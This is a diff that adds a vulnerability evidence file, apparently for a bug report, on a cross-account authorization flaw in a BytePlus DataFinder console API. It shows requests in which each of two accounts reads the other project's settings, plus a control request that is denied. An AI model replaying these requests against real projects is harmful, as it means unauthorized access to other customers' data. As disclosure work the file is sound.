@@ -1,0 +1,31 @@
+Finding: VULN-20261031-001
+Asset: https://console.byteplus.com/datafinder/api/v1/projects/{project_id}/common_settings
+Context: authenticated console session (cookie-based), console.byteplus.com only.
+Cookies and CSRF tokens intentionally omitted from this evidence file.
+
+--- Test 1: Account A -> Account B project ---
+GET /datafinder/api/v1/projects/218463/common_settings?options=custom_multilang,custom_color
+Headers: x-caller: portal
+         x-finder-project-id: 218463
+         x-finder-app-id: 218463
+         x-csrf-token: <account A token>
+Response: HTTP 200
+{"code":200,"message":"success","data":{"custom_color":0,"custom_multilang":{"status":0}}}
+
+--- Test 2: Account B -> Account A project ---
+GET /datafinder/api/v1/projects/2111833/common_settings?options=custom_multilang,custom_color
+Headers: x-caller: portal
+         x-finder-project-id: 2111833
+         x-finder-app-id: 20000341
+         x-csrf-token: <account B token>
+Response: HTTP 200
+{"code":200,"message":"success","data":{"custom_color":0,"custom_multilang":{"status":0}}}
+
+--- Control: a different project-scoped endpoint on the same foreign project ---
+GET /datafinder/api/v1/projects/218463/dashboards/level_list
+Headers: x-finder-project-id: 218463 (account A)
+Response: HTTP 200
+{"code":403001,"message":"Access denied, please check if you were authorized to this project","fmt_params":{}}
+
+Account A project: 2111833 (org 2100230837)
+Account B project: 218463 (org 26172)
